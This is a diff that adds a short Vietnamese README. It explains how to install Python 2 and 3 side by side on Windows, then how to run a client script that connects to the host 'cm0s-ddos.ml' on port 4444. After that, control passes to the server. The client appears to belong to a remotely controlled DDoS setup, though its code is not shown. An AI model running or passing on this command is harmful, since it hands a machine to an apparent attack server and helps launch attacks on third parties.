@@ -1,0 +1,11 @@
+- Cài python2 và python3 trên Windows
+	B1: Tải python2 và python3 cài như bình thường
+	B2: Cài đặt biến môi trường cho python2 vào python3.
+		+ python2: C:\Python27
+		+ python3: C:\Users\<Thay bằng tên user của máy tính>\AppData\Local\Programs\Python\Python37
+	B3: Đổi tên file thực thi trong đường dẫn python3 thành python3.exe
+
+- Kết nối lên server:
+	+ Vào trong thưc mục chứa file chưa file client.py
+	+ Gõ lệnh: python3 client.py cm0s-ddos.ml 4444
+- Phần còn lại để cho server điều kiển.
